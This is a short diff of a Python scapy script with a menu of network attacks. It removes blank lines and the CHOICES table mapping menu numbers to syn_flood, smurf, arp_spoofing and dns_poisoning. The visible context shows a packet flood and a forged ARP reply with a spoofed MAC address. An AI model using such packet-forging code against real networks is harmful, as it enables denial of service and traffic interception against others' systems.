@@ -2,9 +2,6 @@ from scapy.all import *
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 
-
-
-
 def syn_flood():
     msg = Ether(dst=mac_address) / IP(dst=ip_address) / TCP()
     sendp(msg, count=20)
@@ -23,8 +20,6 @@ def dns_poisoning():
 def arp_spoofing():
     msg = Ether(dst=mac_address) / ARP(op='is-at', pdst=ip_address, hwsrc="11:11:11:11:11:11")
     sendp(msg)
-
-CHOICES = {1: syn_flood, 2: smurf, 3: arp_spoofing, 4: dns_poisoning}
 
 
 def menu():
